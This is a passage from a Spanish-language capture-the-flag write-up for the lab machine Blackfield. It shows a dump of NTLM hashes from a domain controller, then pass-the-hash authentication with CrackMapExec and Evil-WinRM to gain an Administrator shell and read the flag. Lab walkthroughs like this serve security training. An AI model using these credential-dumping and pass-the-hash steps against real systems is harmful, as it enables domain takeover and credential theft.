DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...............
...............
...............
```


Empleando el hash NT del usuario `Administrator`, procederé a verificar su validez (aunque debería ser válido) utilizando la herramienta `CrackMapExec`:

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Confirmamos que el hash es válido y, dado que corresponde al usuario `Administrator`, podemos utilizarlo para conectarnos a través de WinRM utilizando la herramienta `Evil-WinRM`. Una vez que hemos obtenido privilegios de `Administrator`, podemos visualizar la última flag:

```
elswix@kali$ evil-winrm -i 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
4375a*********************c955cb
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
